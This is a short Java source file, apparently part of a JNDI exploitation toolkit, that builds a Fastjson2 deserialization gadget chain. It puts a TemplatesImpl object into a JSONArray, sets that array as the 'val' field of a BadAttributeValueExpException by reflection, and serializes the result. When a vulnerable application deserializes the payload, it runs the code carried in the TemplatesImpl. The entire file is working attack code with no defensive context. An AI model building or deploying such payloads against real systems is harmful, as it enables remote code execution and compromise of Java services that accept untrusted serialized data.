package map.jndi.gadget;

import com.alibaba.fastjson2.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import map.jndi.util.ReflectUtil;
import map.jndi.util.SerializeUtil;

import javax.management.BadAttributeValueExpException;

public class Fastjson2 {
    public static byte[] create(TemplatesImpl templatesImpl) throws Exception {
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templatesImpl);

        BadAttributeValueExpException e = new BadAttributeValueExpException("test");
        ReflectUtil.setFieldValue(e, "val", jsonArray);

        return SerializeUtil.serialize(e);
    }
}
